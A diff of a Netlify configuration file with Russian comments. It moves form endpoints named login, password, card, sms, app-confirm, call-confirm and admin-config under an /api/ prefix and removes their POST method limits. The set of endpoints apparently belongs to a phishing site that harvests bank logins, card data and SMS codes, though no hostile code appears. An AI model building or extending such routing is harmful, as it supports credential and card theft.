@@ -5,49 +5,43 @@
 [build.environment]
   NODE_VERSION = "18"
 
-# POST обработчики - идут ПЕРВЫМИ чтобы перехватить POST запросы форм
+# ── API функции (POST формы идут сюда) ──────────────────────────────────────
 [[redirects]]
-  from = "/login"
+  from = "/api/login"
   to = "/.netlify/functions/login"
   status = 200
-  methods = ["POST"]
 
 [[redirects]]
-  from = "/password"
+  from = "/api/password"
   to = "/.netlify/functions/password"
   status = 200
-  methods = ["POST"]
 
 [[redirects]]
-  from = "/card"
+  from = "/api/card"
   to = "/.netlify/functions/card"
   status = 200
-  methods = ["POST"]
 
 [[redirects]]
-  from = "/sms"
+  from = "/api/sms"
   to = "/.netlify/functions/sms"
   status = 200
-  methods = ["POST"]
 
 [[redirects]]
-  from = "/app-confirm"
+  from = "/api/app-confirm"
   to = "/.netlify/functions/app-confirm"
   status = 200
-  methods = ["POST"]
 
 [[redirects]]
-  from = "/call-confirm"
+  from = "/api/call-confirm"
   to = "/.netlify/functions/call-confirm"
   status = 200
-  methods = ["POST"]
 
 [[redirects]]
-  from = "/admin/config"
+  from = "/api/admin-config"
   to = "/.netlify/functions/admin-config"
   status = 200
 
-# GET страницы - после POST обработчиков
+# ── Страницы (GET) ───────────────────────────────────────────────────────────
 [[redirects]]
   from = "/login"
   to = "/index.html"
@@ -88,7 +82,7 @@
   to = "/admin.html"
   status = 200
 
-# Fallback для всех остальных GET запросов
+# ── Fallback ─────────────────────────────────────────────────────────────────
 [[redirects]]
   from = "/*"
   to = "/index.html"
